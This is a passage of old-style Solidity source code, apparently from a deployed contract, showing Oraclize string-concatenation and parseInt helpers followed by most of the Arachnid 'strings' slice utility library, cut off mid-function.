subindex++;\r\r\r\n                    }   \r\r\r\n                    if(subindex == n.length)\r\r\r\n                        return int(i);\r\r\r\n                }\r\r\r\n            }\r\r\r\n            return -1;\r\r\r\n        }   \r\r\r\n    }\r\r\r\n\r\r\r\n    function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string){\r\r\r\n        bytes memory _ba = bytes(_a);\r\r\r\n        bytes memory _bb = bytes(_b);\r\r\r\n        bytes memory _bc = bytes(_c);\r\r\r\n        bytes memory _bd = bytes(_d);\r\r\r\n        bytes memory _be = bytes(_e);\r\r\r\n        string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\r\r\r\n        bytes memory babcde = bytes(abcde);\r\r\r\n        uint k = 0;\r\r\r\n        for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\r\r\r\n        for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\r\r\r\n        for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\r\r\r\n        for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\r\r\r\n        for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\r\r\r\n        return string(babcde);\r\r\r\n    }\r\r\r\n    \r\r\r\n    function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\r\r\r\n        return strConcat(_a, _b, _c, _d, \"\");\r\r\r\n    }\r\r\r\n\r\r\r\n    function strConcat(string _a, string _b, string _c) internal returns (string) {\r\r\r\n        return strConcat(_a, _b, _c, \"\", \"\");\r\r\r\n    }\r\r\r\n\r\r\r\n    function strConcat(string _a, string _b) internal returns (string) {\r\r\r\n        return strConcat(_a, _b, \"\", \"\", \"\");\r\r\r\n    }\r\r\r\n\r\r\r\n    \/\/ parseInt\r\r\r\n    function parseInt(string _a) internal returns (uint) {\r\r\r\n        return parseInt(_a, 0);\r\r\r\n    }\r\r\r\n\r\r\r\n    \/\/ parseInt(parseFloat*10^_b)\r\r\r\n    function parseInt(string _a, uint _b) internal returns (uint) {\r\r\r\n        bytes memory bresult = bytes(_a);\r\r\r\n        uint mint = 0;\r\r\r\n        bool decimals = false;\r\r\r\n        for (uint i=0; i<bresult.length; i++){\r\r\r\n            if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\r\r\r\n                if (decimals){\r\r\r\n                   if (_b == 0) break;\r\r\r\n                    else _b--;\r\r\r\n                }\r\r\r\n                mint *= 10;\r\r\r\n                mint += uint(bresult[i]) - 48;\r\r\r\n            } else if (bresult[i] == 46) decimals = true;\r\r\r\n        }\r\r\r\n        if (_b > 0) mint *= 10**_b;\r\r\r\n        return mint;\r\r\r\n    }\r\r\r\n    \r\r\r\n\r\r\r\n}\r\r\r\n\/\/ <\/ORACLIZE_API>\r\r\r\n\r\r\r\n\r\r\r\n\/**************************************************************************\r\r\r\n *\r\r\r\n *\tArachnid Strings utils.\r\r\r\n *\r\r\r\n **************************************************************************\/\r\r\r\n\r\r\r\n\/*\r\r\r\n * @title String & slice utility library for Solidity contracts.\r\r\r\n * @author Nick Johnson <[email\u00a0protected]>\r\r\r\n *\r\r\r\n * @dev Functionality in this library is largely implemented using an\r\r\r\n *      abstraction called a 'slice'. A slice represents a part of a string -\r\r\r\n *      anything from the entire string to a single character, or even no\r\r\r\n *      characters at all (a 0-length slice). Since a slice only has to specify\r\r\r\n *      an offset and a length, copying and manipulating slices is a lot less\r\r\r\n *      expensive than copying and manipulating the strings they reference.\r\r\r\n *\r\r\r\n *      To further reduce gas costs, most functions on slice that need to return\r\r\r\n *      a slice modify the original one instead of allocating a new one; for\r\r\r\n *      instance, `s.split(\".\")` will return the text up to the first '.',\r\r\r\n *      modifying s to only contain the remainder of the string after the '.'.\r\r\r\n *      In situations where you do not want to modify the original slice, you\r\r\r\n *      can make a copy first with `.copy()`, for example:\r\r\r\n *      `s.copy().split(\".\")`. Try and avoid using this idiom in loops; since\r\r\r\n *      Solidity has no memory management, it will result in allocating many\r\r\r\n *      short-lived slices that are later discarded.\r\r\r\n *\r\r\r\n *      Functions that return two slices come in two versions: a non-allocating\r\r\r\n *      version that takes the second slice as an argument, modifying it in\r\r\r\n *      place, and an allocating version that allocates and returns the second\r\r\r\n *      slice; see `nextRune` for example.\r\r\r\n *\r\r\r\n *      Functions that have to copy string data will return strings rather than\r\r\r\n *      slices; these can be cast back to slices for further processing if\r\r\r\n *      required.\r\r\r\n *\r\r\r\n *      For convenience, some functions are provided with non-modifying\r\r\r\n *      variants that create a new slice and return both; for instance,\r\r\r\n *      `s.splitNew('.')` leaves s unmodified, and returns two values\r\r\r\n *      corresponding to the left and right parts of the string.\r\r\r\n *\/\r\r\r\nlibrary strings {\r\r\r\n    struct slice {\r\r\r\n        uint _len;\r\r\r\n        uint _ptr;\r\r\r\n    }\r\r\r\n\r\r\r\n    function memcpy(uint dest, uint src, uint len) private {\r\r\r\n        \/\/ Copy word-length chunks while possible\r\r\r\n        for(; len >= 32; len -= 32) {\r\r\r\n            assembly {\r\r\r\n                mstore(dest, mload(src))\r\r\r\n            }\r\r\r\n            dest += 32;\r\r\r\n            src += 32;\r\r\r\n        }\r\r\r\n\r\r\r\n        \/\/ Copy remaining bytes\r\r\r\n        uint mask = 256 ** (32 - len) - 1;\r\r\r\n        assembly {\r\r\r\n            let srcpart := and(mload(src), not(mask))\r\r\r\n            let destpart := and(mload(dest), mask)\r\r\r\n            mstore(dest, or(destpart, srcpart))\r\r\r\n        }\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns a slice containing the entire string.\r\r\r\n     * @param self The string to make a slice from.\r\r\r\n     * @return A newly allocated slice containing the entire string.\r\r\r\n     *\/\r\r\r\n    function toSlice(string self) internal returns (slice) {\r\r\r\n        uint ptr;\r\r\r\n        assembly {\r\r\r\n            ptr := add(self, 0x20)\r\r\r\n        }\r\r\r\n        return slice(bytes(self).length, ptr);\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns the length of a null-terminated bytes32 string.\r\r\r\n     * @param self The value to find the length of.\r\r\r\n     * @return The length of the string, from 0 to 32.\r\r\r\n     *\/\r\r\r\n    function len(bytes32 self) internal returns (uint) {\r\r\r\n        uint ret;\r\r\r\n        if (self == 0)\r\r\r\n            return 0;\r\r\r\n        if (self & 0xffffffffffffffffffffffffffffffff == 0) {\r\r\r\n            ret += 16;\r\r\r\n            self = bytes32(uint(self) \/ 0x100000000000000000000000000000000);\r\r\r\n        }\r\r\r\n        if (self & 0xffffffffffffffff == 0) {\r\r\r\n            ret += 8;\r\r\r\n            self = bytes32(uint(self) \/ 0x10000000000000000);\r\r\r\n        }\r\r\r\n        if (self & 0xffffffff == 0) {\r\r\r\n            ret += 4;\r\r\r\n            self = bytes32(uint(self) \/ 0x100000000);\r\r\r\n        }\r\r\r\n        if (self & 0xffff == 0) {\r\r\r\n            ret += 2;\r\r\r\n            self = bytes32(uint(self) \/ 0x10000);\r\r\r\n        }\r\r\r\n        if (self & 0xff == 0) {\r\r\r\n            ret += 1;\r\r\r\n        }\r\r\r\n        return 32 - ret;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns a slice containing the entire bytes32, interpreted as a\r\r\r\n     *      null-termintaed utf-8 string.\r\r\r\n     * @param self The bytes32 value to convert to a slice.\r\r\r\n     * @return A new slice containing the value of the input argument up to the\r\r\r\n     *         first null.\r\r\r\n     *\/\r\r\r\n    function toSliceB32(bytes32 self) internal returns (slice ret) {\r\r\r\n        \/\/ Allocate space for `self` in memory, copy it there, and point ret at it\r\r\r\n        assembly {\r\r\r\n            let ptr := mload(0x40)\r\r\r\n            mstore(0x40, add(ptr, 0x20))\r\r\r\n            mstore(ptr, self)\r\r\r\n            mstore(add(ret, 0x20), ptr)\r\r\r\n        }\r\r\r\n        ret._len = len(self);\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns a new slice containing the same data as the current slice.\r\r\r\n     * @param self The slice to copy.\r\r\r\n     * @return A new slice containing the same data as `self`.\r\r\r\n     *\/\r\r\r\n    function copy(slice self) internal returns (slice) {\r\r\r\n        return slice(self._len, self._ptr);\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Copies a slice to a new string.\r\r\r\n     * @param self The slice to copy.\r\r\r\n     * @return A newly allocated string containing the slice's text.\r\r\r\n     *\/\r\r\r\n    function toString(slice self) internal returns (string) {\r\r\r\n        var ret = new string(self._len);\r\r\r\n        uint retptr;\r\r\r\n        assembly { retptr := add(ret, 32) }\r\r\r\n\r\r\r\n        memcpy(retptr, self._ptr, self._len);\r\r\r\n        return ret;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns the length in runes of the slice. Note that this operation\r\r\r\n     *      takes time proportional to the length of the slice; avoid using it\r\r\r\n     *      in loops, and call `slice.empty()` if you only need to know whether\r\r\r\n     *      the slice is empty or not.\r\r\r\n     * @param self The slice to operate on.\r\r\r\n     * @return The length of the slice in runes.\r\r\r\n     *\/\r\r\r\n    function len(slice self) internal returns (uint) {\r\r\r\n        \/\/ Starting at ptr-31 means the LSB will be the byte we care about\r\r\r\n        var ptr = self._ptr - 31;\r\r\r\n        var end = ptr + self._len;\r\r\r\n        for (uint len = 0; ptr < end; len++) {\r\r\r\n            uint8 b;\r\r\r\n            assembly { b := and(mload(ptr), 0xFF) }\r\r\r\n            if (b < 0x80) {\r\r\r\n                ptr += 1;\r\r\r\n            } else if(b < 0xE0) {\r\r\r\n                ptr += 2;\r\r\r\n            } else if(b < 0xF0) {\r\r\r\n                ptr += 3;\r\r\r\n            } else if(b < 0xF8) {\r\r\r\n                ptr += 4;\r\r\r\n            } else if(b < 0xFC) {\r\r\r\n                ptr += 5;\r\r\r\n            } else {\r\r\r\n                ptr += 6;\r\r\r\n            }\r\r\r\n        }\r\r\r\n        return len;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns true if the slice is empty (has a length of 0).\r\r\r\n     * @param self The slice to operate on.\r\r\r\n     * @return True if the slice is empty, False otherwise.\r\r\r\n     *\/\r\r\r\n    function empty(slice self) internal returns (bool) {\r\r\r\n        return self._len == 0;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns a positive number if `other` comes lexicographically after\r\r\r\n     *      `self`, a negative number if it comes before, or zero if the\r\r\r\n     *      contents of the two slices are equal. Comparison is done per-rune,\r\r\r\n     *      on unicode codepoints.\r\r\r\n     * @param self The first slice to compare.\r\r\r\n     * @param other The second slice to compare.\r\r\r\n     * @return The result of the comparison.\r\r\r\n     *\/\r\r\r\n    function compare(slice self, slice other) internal returns (int) {\r\r\r\n        uint shortest = self._len;\r\r\r\n        if (other._len < self._len)\r\r\r\n            shortest = other._len;\r\r\r\n\r\r\r\n        var selfptr = self._ptr;\r\r\r\n        var otherptr = other._ptr;\r\r\r\n        for (uint idx = 0; idx < shortest; idx += 32) {\r\r\r\n            uint a;\r\r\r\n            uint b;\r\r\r\n            assembly {\r\r\r\n                a := mload(selfptr)\r\r\r\n                b := mload(otherptr)\r\r\r\n            }\r\r\r\n            if (a != b) {\r\r\r\n                \/\/ Mask out irrelevant bytes and check again\r\r\r\n                uint mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\r\r\n                var diff = (a & mask) - (b & mask);\r\r\r\n                if (diff != 0)\r\r\r\n                    return int(diff);\r\r\r\n            }\r\r\r\n            selfptr += 32;\r\r\r\n            otherptr += 32;\r\r\r\n        }\r\r\r\n        return int(self._len) - int(other._len);\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns true if the two slices contain the same text.\r\r\r\n     * @param self The first slice to compare.\r\r\r\n     * @param self The second slice to compare.\r\r\r\n     * @return True if the slices are equal, false otherwise.\r\r\r\n     *\/\r\r\r\n    function equals(slice self, slice other) internal returns (bool) {\r\r\r\n        return compare(self, other) == 0;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Extracts the first rune in the slice into `rune`, advancing the\r\r\r\n     *      slice to point to the next rune and returning `self`.\r\r\r\n     * @param self The slice to operate on.\r\r\r\n     * @param rune The slice that will contain the first rune.\r\r\r\n     * @return `rune`.\r\r\r\n     *\/\r\r\r\n    function nextRune(slice self, slice rune) internal returns (slice) {\r\r\r\n        rune._ptr = self._ptr;\r\r\r\n\r\r\r\n        if (self._len == 0) {\r\r\r\n            rune._len = 0;\r\r\r\n            return rune;\r\r\r\n        }\r\r\r\n\r\r\r\n        uint len;\r\r\r\n        uint b;\r\r\r\n        \/\/ Load the first byte of the rune into the LSBs of b\r\r\r\n        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\r\r\r\n        if (b < 0x80) {\r\r\r\n            len = 1;\r\r\r\n        } else if(b < 0xE0) {\r\r\r\n            len = 2;\r\r\r\n        } else if(b < 0xF0) {\r\r\r\n            len = 3;\r\r\r\n        } else {\r\r\r\n            len = 4;\r\r\r\n        }\r\r\r\n\r\r\r\n        \/\/ Check for truncated codepoints\r\r\r\n        if (len > self._len) {\r\r\r\n            rune._len = self._len;\r\r\r\n            self._ptr += self._len;\r\r\r\n            self._len = 0;\r\r\r\n            return rune;\r\r\r\n        }\r\r\r\n\r\r\r\n        self._ptr += len;\r\r\r\n        self._len -= len;\r\r\r\n        rune._len = len;\r\r\r\n        return rune;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns the first rune in the slice, advancing the slice to point\r\r\r\n     *      to the next rune.\r\r\r\n     * @param self The slice to operate on.\r\r\r\n     * @return A slice containing only the first rune from `self`.\r\r\r\n     *\/\r\r\r\n    function nextRune(slice self) internal returns (slice ret) {\r\r\r\n        nextRune(self, ret);\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns the number of the first codepoint in the slice.\r\r\r\n     * @param self The slice to operate on.\r\r\r\n     * @return The number of the first codepoint in the slice.\r\r\r\n     *\/\r\r\r\n    function ord(slice self) internal returns (uint ret) {\r\r\r\n        if (self._len == 0) {\r\r\r\n            return 0;\r\r\r\n        }\r\r\r\n\r\r\r\n        uint word;\r\r\r\n        uint len;\r\r\r\n        uint div = 2 ** 248;\r\r\r\n\r\r\r\n        \/\/ Load the rune into the MSBs of b\r\r\r\n        assembly { word:= mload(mload(add(self, 32))) }\r\r\r\n        var b = word \/ div;\r\r\r\n        if (b < 0x80) {\r\r\r\n            ret = b;\r\r\r\n            len = 1;\r\r\r\n        } else if(b < 0xE0) {\r\r\r\n            ret = b & 0x1F;\r\r\r\n            len = 2;\r\r\r\n        } else if(b < 0xF0) {\r\r\r\n            ret = b & 0x0F;\r\r\r\n            len = 3;\r\r\r\n        } else {\r\r\r\n            ret = b & 0x07;\r\r\r\n            len = 4;\r\r\r\n        }\r\r\r\n\r\r\r\n        \/\/ Check for truncated codepoints\r\r\r\n        if (len > self._len) {\r\r\r\n            return 0;\r\r\r\n        }\r\r\r\n\r\r\r\n        for (uint i = 1; i < len; i++) {\r\r\r\n            div = div \/ 256;\r\r\r\n            b = (word \/ div) & 0xFF;\r\r\r\n            if (b & 0xC0 != 0x80) {\r\r\r\n                \/\/ Invalid UTF-8 sequence\r\r\r\n                return 0;\r\r\r\n            }\r\r\r\n            ret = (ret * 64) | (b & 0x3F);\r\r\r\n        }\r\r\r\n\r\r\r\n        return ret;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns the keccak-256 hash of the slice.\r\r\r\n     * @param self The slice to hash.\r\r\r\n     * @return The hash of the slice.\r\r\r\n     *\/\r\r\r\n    function keccak(slice self) internal returns (bytes32 ret) {\r\r\r\n        assembly {\r\r\r\n            ret := sha3(mload(add(self, 32)), mload(self))\r\r\r\n        }\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns true if `self` starts with `needle`.\r\r\r\n     * @param self The slice to operate on.\r\r\r\n     * @param needle The slice to search for.\r\r\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\r\r\n     *\/\r\r\r\n    function startsWith(slice self, slice needle) internal returns (bool) {\r\r\r\n        if (self._len < needle._len) {\r\r\r\n            return false;\r\r\r\n        }\r\r\r\n\r\r\r\n        if (self._ptr == needle._ptr) {\r\r\r\n            return true;\r\r\r\n        }\r\r\r\n\r\r\r\n        bool equal;\r\r\r\n        assembly {\r\r\r\n            let len := mload(needle)\r\r\r\n            let selfptr := mload(add(self, 0x20))\r\r\r\n            let needleptr := mload(add(needle, 0x20))\r\r\r\n            equal := eq(sha3(selfptr, len), sha3(needleptr, len))\r\r\r\n        }\r\r\r\n        return equal;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev If `self` starts with `needle`, `needle` is removed from the\r\r\r\n     *      beginning of `self`. Otherwise, `self` is unmodified.\r\r\r\n     * @param self The slice to operate on.\r\r\r\n     * @param needle The slice to search for.\r\r\r\n     * @return `self`\r\r\r\n     *\/\r\r\r\n    function beyond(slice self, slice needle) internal returns (slice) {\r\r\r\n        if (self._len < needle._len) {\r\r\r\n            return self;\r\r\r\n        }\r\r\r\n\r\r\r\n        bool equal = true;\r\r\r\n        if (self._ptr != needle._ptr) {\r\r\r\n            assembly {\r\r\r\n                let len := mload(needle)\r\r\r\n                let selfptr := mload(add(self, 0x20))\r\r\r\n                let needleptr := mload(add(needle, 0x20))\r\r\r\n                equal := eq(sha3(selfptr, len), sha3(needleptr, len))\r\r\r\n            }\r\r\r\n        }\r\r\r\n\r\r\r\n        if (equal) {\r\r\r\n            self._len -= needle._len;\r\r\r\n            self._ptr += needle._len;\r\r\r\n        }\r\r\r\n\r\r\r\n        return self;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns true if the slice ends with `needle`.\r\r\r\n     * @param self The slice to operate on.\r\r\r\n     * @param needle The slice to search for.\r\r\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\r\r\n     *\/\r\r\r\n    function endsWith(slice self, slice needle) internal returns (bool) {\r\r\r\n        if (self._len < needle._len) {\r\r\r\n            return false;\r\r\r\n        }\r\r\r\n\r\r\r\n        var selfptr = self._ptr + self._len - needle._len;\r\r\r\n\r\r\r\n        if (selfptr == needle._ptr) {\r\r\r\n            return true;\r\r\r\n        }\r\r\r\n\r\r\r\n        bool equal;\r\r\r\n        assembly {\r\r\r\n            let len := mload(needle)\r\r\r\n            let needleptr := mload(add(needle, 0x20))\r\r\r\n            equal := eq(sha3(selfptr, len), sha3(needleptr, len))\r\r\r\n        }\r\r\r\n\r\r\r\n        return equal;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev If `self` ends with `needle`, `needle` is removed from the\r\r\r\n     *      end of `self`. Otherwise, `self` is unmodified.\r\r\r\n     * @param self The slice to operate on.\r\r\r\n     * @param needle The slice to search for.\r\r\r\n     * @return `self`\r\r\r\n     *\/\r\r\r\n    function until(slice self, slice needle) internal returns (slice) {\r\r\r\n        if (self._len < needle._len) {\r\r\r\n            return self;\r\r\r\n        }\r\r\r\n\r\r\r\n        var selfptr = self._ptr + self._len - needle._len;\r\r\r\n        bool equal = true;\r\r\r\n        if (selfptr != needle._ptr) {\r\r\r\n            assembly {\r\r\r\n                let len := mload(needle)\r\r\r\n                let needleptr := mload(add(needle, 0x20))\r\r\r\n                equal := eq(sha3(selfptr, len), sha3(needleptr, len))\r\r\r\n            }\r\r\r\n        }\r\r\r\n\r\r\r\n        if (equal) {\r\r\r\n            self._len -= needle._len;\r\r\r\n        }\r\r\r\n\r\r\r\n        return self;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/\/ Returns the memory address of the first byte of the first occurrence of\r\r\r\n    \/\/ `needle` in `self`, or the first byte after `self` if not found.\r\r\r\n    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\r\r\r\n        uint ptr;\r\r\r\n        uint idx;\r\r\r\n\r\r\r\n        if (needlelen <= selflen) {\r\r\r\n            if (needlelen <= 32) {\r\r\r\n                \/\/ Optimized assembly for 68 gas per byte on short strings\r\r\r\n                assembly {\r\r\r\n                    let mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\r\r\r\n                    let needledata := and(mload(needleptr), mask)\r\r\r\n                    let end := add(selfptr, sub(selflen, needlelen))\r\r\r\n                    ptr := selfptr\r\r\r\n                    loop:\r\r\r\n                    jumpi(exit, eq(and(mload(ptr), mask), needledata))\r\r\r\n                    ptr := add(ptr, 1)\r\r\r\n                    jumpi(loop, lt(sub(ptr, 1), end))\r\r\r\n                    ptr := add(selfptr, selflen)\r\r\r\n                    exit:\r\r\r\n                }\r\r\r\n                return ptr;\r\r\r\n            } else {\r\r\r\n                \/\/ For long needles, use hashing\r\r\r\n                bytes32 hash;\r\r\r\n                assembly { hash := sha3(needleptr, needlelen) }\r\r\r\n                ptr = selfptr;\r\r\r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\r\r\n                    bytes32 testHash;\r\r\r\n                    assembly { testHash := sha3(ptr, needlelen) }\r\r\r\n                    if (hash == testHash)\r\r\r\n                        return ptr;\r\r\r\n                    ptr += 1;\r\r\r\n                }\r\r\r\n            }\r\r\r\n        }\r\r\r\n        return selfptr + selflen;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/\/ Returns the memory address of the first byte after the last occurrence of\r\r\r\n    \/\/ `needle` in `self`, or the address of `self` if not found.\r\r\r\n    function rfindPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\r\r\r\n        uint ptr;\r\r\r\n\r\r\r\n        if (needlelen <= selflen) {\r\r\r\n            if (needlelen <= 32) {\r\r\r\n                \/\/ Optimized assembly for 69 gas per byte on short strings\r\r\r\n                assembly {\r\r\r\n                    let mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\r\r\r\n                    let needledata := and(mload(needleptr), mask)\r\r\r\n                    ptr := add(selfptr, sub(selflen, needlelen))\r\r\r\n                    loop:\r\r\r\n                    jumpi(ret, eq(and(mload(ptr), mask), needledata))\r\r\r\n                    ptr := sub(ptr, 1)\r\r\r\n                    jumpi(loop, gt(add(ptr, 1), selfptr))\r\r\r\n                    ptr := selfptr\r\r\r\n                    jump(exit)\r\r\r\n                    ret:\r\r\r\n                    ptr := add(ptr, needlelen)\r\r\r\n                    exit:\r\r\r\n                }\r\r\r\n                return ptr;\r\r\r\n            } else {\r\r\r\n                \/\/ For long needles, use hashing\r\r\r\n                bytes32 hash;\r\r\r\n                assembly { hash := sha3(needleptr, needlelen) }\r\r\r\n                ptr = selfptr + (selflen - needlelen);\r\r\r\n                while (ptr >= selfptr) {\r\r\r\n                    bytes32 testHash;\r\r\r\n                    assembly { testHash := sha3(ptr, needlelen) }\r\r\r\n                    if (hash == testHash)\r\r\r\n                        return ptr + needlelen;\r\r\r\n                    ptr -= 1;\r\r\r\n                }\r\r\r\n            }\r\r\r\n        }\r\r\r\n        return selfptr;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Modifies `self` to contain everything from the first occurrence of\r\r\r\n     *      `needle` to the end of the slice. `self` is set to the empty slice\r\r\r\n     *      if `needle` is not found.\r\r\r\n     * @param self The slice to search and modify.\r\r\r\n     * @param needle The text to search for.\r\r\r\n     * @return `self`.\r\r\r\n     *\/\r\r\r\n    function find(slice self, slice needle) internal returns (slice) {\r\r\r\n        uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\r\r\r\n        self._len -= ptr - self._ptr;\r\r\r\n        self._ptr = ptr;\r\r\r\n        return self;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Modifies `self` to contain the part of the string from the start of\r\r\r\n     *      `self` to the end of the first occurrence of `needle`. If `needle`\r\r\r\n     *      is not found, `self` is set to the empty slice.\r\r\r\n     * @param self The slice to search and modify.\r\r\r\n     * @param needle The text to search for.\r\r\r\n     * @return `self`.\r\r\r\n     *\/\r\r\r\n    function rfind(slice self, slice needle) internal returns (slice) {\r\r\r\n        uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\r\r\r\n        self._len = ptr - self._ptr;\r\r\r\n        return self;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Splits the slice, setting `self` to everything after the first\r\r\r\n     *      occurrence of `needle`, and `token` to everything before it. If\r\r\r\n     *      `needle` does not occur in `self`, `self` is set to the empty slice,\r\r\r\n     *      and `token` is set to the entirety of `self`.\r\r\r\n     * @param self The slice to split.\r\r\r\n     * @param needle The text to search for in `self`.\r\r\r\n     * @param token An output parameter to which the first token is written.\r\r\r\n     * @return `token`.\r\r\r\n     *\/\r\r\r\n    function split(slice self, slice needle, slice token) internal returns (slice) {\r\r\r\n        uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\r\r\r\n        token._ptr = self._ptr;\r\r\r\n        token._len = ptr - self._ptr;\r\r\r\n        if (ptr == self._ptr + self._len) {\r\r\r\n            \/\/ Not found\r\r\r\n            self._len = 0;\r\r\r\n        } else {\r\r\r\n            self._len -= token._len + needle._len;\r\r\r\n            self._ptr = ptr + needle._len;\r\r\r\n        }\r\r\r\n        return token;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Splits the slice, setting `self` to everything after the first\r\r\r\n     *      occurrence of `needle`, and returning everything before it. If\r\r\r\n     *      `needle` does not occur in `self`, `self` is set to the empty slice,\r\r\r\n     *      and the entirety of `self` is returned.\r\r\r\n     * @param self The slice to split.\r\r\r\n     * @param needle The text to search for in `self`.\r\r\r\n     * @return The part of `self` up to the first occurrence of `delim`.\r\r\r\n     *\/\r\r\r\n    function split(slice self, slice needle) internal returns (slice token) {\r\r\r\n        split(self, needle, token);\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Splits the slice, setting `self` to everything before the last\r\r\r\n     *      occurrence of `needle`, and `token` to everything after it. If\r\r\r\n     *      `needle` does not occur in `self`, `self` is set to the empty slice,\r\r\r\n     *      and `token` is set to the entirety of `self`.\r\r\r\n     * @param self The slice to split.\r\r\r\n     * @param needle The text to search for in `self`.\r\r\r\n     * @param token An output parameter to which the first token is written.\r\r\r\n     * @return `token`.\r\r\r\n     *\/\r\r\r\n    function rsplit(slice self, slice needle, slice token) internal returns (slice) {\r\r\r\n        uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\r\r\r\n        token._ptr = ptr;\r\r\r\n        token._len = self._len - (ptr - self._ptr);\r\r\r\n        if (ptr == self._ptr) {\r\r\r\n            \/\/ Not found\r\r\r\n            self._len = 0;\r\r\r\n        } else {\r\r\r\n            self._len -= token._len + needle._len;\r\r\r\n        }\r\r\r\n        return token;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Splits the slice, setting `self` to everything before the last\r\r\r\n     *      occurrence of `needle`, and returning everything after it. If\r\r\r\n     *      `needle` does not occur in `self`, `self` is set to the empty slice,\r\r\r\n     *      and the entirety of `self` is returned.\r\r\r\n     * @param self The slice to split.\r\r\r\n     * @param needle The text to search for in `self`.\r\r\r\n     * @return The part of `self` after the last occurrence of `delim`.\r\r\r\n     *\/\r\r\r\n    function rsplit(slice self, slice needle) internal returns (slice token) {\r\r\r\n        rsplit(self, needle, token);\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Counts the number of nonoverlapping occurrences of `needle` in `self`.\r\r\r\n     * @param self The slice to search.\r\r\r\n     * @param needle The text to search for in `self`.\r\r\r\n     * @return The number of occurrences of `needle` found in `self`.\r\r\r\n     *\/\r\r\r\n    function count(slice self, slice needle) internal returns (uint count) {\r\r\r\n        uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len;\r\r\r\n        while (ptr <= self._ptr + self._len) {\r\r\r\n            count++;\r\r\r\n            ptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len;\r\r\r\n        }\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns True if `self` contains `needle`.\r\r\r\n     * @param self The slice to search.\r\r\r\n     * @param needle The text to search for in `self`.\r\r\r\n     * @return True if `needle` is found in `self`, false otherwise.\r\r\r\n     *\/\r\r\r\n    function contains(slice self, slice needle) internal returns (bool) {\r\r\r\n        return rfindPtr(self._len, self._ptr, needle._len, needle._ptr) != self._ptr;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Returns a newly allocated string containing the concatenation of\r\r\r\n     *      `self` and `other`.\r\r\r\n     * @param self The first slice to concatenate.\r\r\r\n     * @param other The second slice to concatenate.\r\r\r\n     * @return The concatenation of the two strings.\r\r\r\n     *\/\r\r\r\n    function concat(slice self, slice other) internal returns (string) {\r\r\r\n        var ret = new string(self._len + other._len);\r\r\r\n        uint retptr;\r\r\r\n        assembly { retptr := add(ret, 32) }\r\r\r\n        memcpy(retptr, self._ptr, self._len);\r\r\r\n        memcpy(retptr + self._len, other._ptr, other._len);\r\r\r\n        return ret;\r\r\r\n    }\r\r\r\n\r\r\r\n    \/*\r\r\r\n     * @dev Joins an array of slices, using `self` as a delimiter, returning a\r\r\r\n     *      newly allocated string.\r\r\r\n     * @param self The delimiter to use.\r\r\r\n     * @param parts A list of slices to join.\r\r\r\n     * @return A newly allocated string containing all the slices in `parts`,\r\r\r\n     *         joined with `self`.\r\r\r\n     *\/\r\r\r\n    function join(slice self, slice[] parts) internal returns (string) {\r\r\r\n        if (parts.length == 0)\r\r\r\n            return \"\";\r\r\r\n\r\r\r\n        uint len = self._len * 